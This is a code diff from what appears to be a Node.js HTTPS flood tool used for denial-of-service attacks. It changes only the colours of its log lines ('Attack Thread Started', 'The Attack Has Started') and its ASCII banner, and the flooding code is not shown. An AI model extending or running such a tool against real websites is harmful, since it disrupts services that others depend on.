@@ -28,7 +28,7 @@ const getCurrentTime = () => {
    const hours = now.getHours().toString().padStart(2, '0');
    const minutes = now.getMinutes().toString().padStart(2, '0');
    const seconds = now.getSeconds().toString().padStart(2, '0');
-   return `(\x1b[34m${hours}:${minutes}:${seconds}\x1b[0m)`;
+   return `\x1b[38;5;255m(\x1b[38;5;160m${hours}:${minutes}:${seconds}\x1b[38;5;255m)`;
  };
 
  const targetURL = process.argv[2];
@@ -46,16 +46,16 @@ const getCurrentTime = () => {
  Promise.race([axiosPromise, timeoutPromise])
    .then((response) => {
      const { status, data } = response;
-     console.log(`[\x1b[35mHTTPS\x1b[0m] ${getCurrentTime()} Title: ${getTitleFromHTML(data)} (\x1b[32m${status}\x1b[0m)`);
+     console.log(`\x1b[38;5;255m[\x1b[38;5;160mHTTPS\x1b[38;5;255m] ${getCurrentTime()} Title: \x1b[38;5;160m${getTitleFromHTML(data)} \x1b[38;5;255m(\x1b[32m${status}\x1b[38;5;255m)`);
    })
    .catch((error) => {
      if (error.message === 'Request timed out') {
-       console.log(`[\x1b[35mHTTPS\x1b[0m] ${getCurrentTime()} Request Timed Out`);
+       console.log(`\x1b[38;5;255m[\x1b[38;5;160mHTTPS\x1b[38;5;255m] ${getCurrentTime()} Request Timed Out`);
      } else if (error.response) {
        const extractedTitle = getTitleFromHTML(error.response.data);
-       console.log(`[\x1b[35mHTTPS\x1b[0m] ${getCurrentTime()} Title: ${extractedTitle} (\x1b[31m${error.response.status}\x1b[0m)`);
+       console.log(`\x1b[38;5;255m[\x1b[38;5;160mHTTPS\x1b[38;5;255m] ${getCurrentTime()} Title: ${extractedTitle} \x1b[38;5;255m(\x1b[31m${error.response.status}\x1b[38;5;255m)`);
      } else {
-       console.log(`[\x1b[35mHTTPS\x1b[0m] ${getCurrentTime()} ${error.message}`);
+       console.log(`\x1b[38;5;255m[\x1b[38;5;160mHTTPS\x1b[38;5;255m] ${getCurrentTime()} ${error.message}`);
      }
    });
 }
@@ -106,21 +106,20 @@ const args = {
 if (cluster.isMaster){
  console.clear();
  console.log(`
-  __ _________________  ____
- / // /_  __/_  __/ _ \/ __/
-/ _  / / /   / / / ___/\ \  
-/_//_/ /_/   /_/ /_/  /___/  
-                                                                 
+                   __ _________________  ____
+                  / // /_  __/_  __/ _ \/ __/
+                 / _  / / /   / / / ___/\ \  
+                /_//_/ /_/   /_/ /_/  /___/                                                                  
 `);
  
  for (let i = 1; i <= process.argv[5]; i++){
    cluster.fork();
-   console.log(`[\x1b[35mHTTPS\x1b[0m] ${getCurrentTime()} Attack Thread ${i} Started`);
+   console.log(`\x1b[38;5;255m[\x1b[38;5;160mHTTPS\x1b[38;5;255m] ${getCurrentTime()} \x1b[38;5;255mAttack Thread \x1b[38;5;160m${i}\x1b[38;5;255m Started`);
  }
- console.log(`[\x1b[35mHTTPS\x1b[0m] ${getCurrentTime()} The Attack Has Started`);
+ console.log(`\x1b[38;5;255m[\x1b[38;5;160mHTTPS\x1b[38;5;255m] ${getCurrentTime()} \x1b[38;5;255mThe Attack Has Started`);
  setInterval(getStatus, 2000);
  setTimeout(() => {
-   console.log(`[\x1b[35mHTTPS\x1b[0m] ${getCurrentTime()} The Attack Is Over`);
+   console.log(`\x1b[38;5;255m[\x1b[38;5;160mHTTPS\x1b[38;5;255m] ${getCurrentTime()} \x1b[38;5;255mThe Attack Is Over`);
    process.exit(1);
  }, process.argv[3] * 1000);
 } 
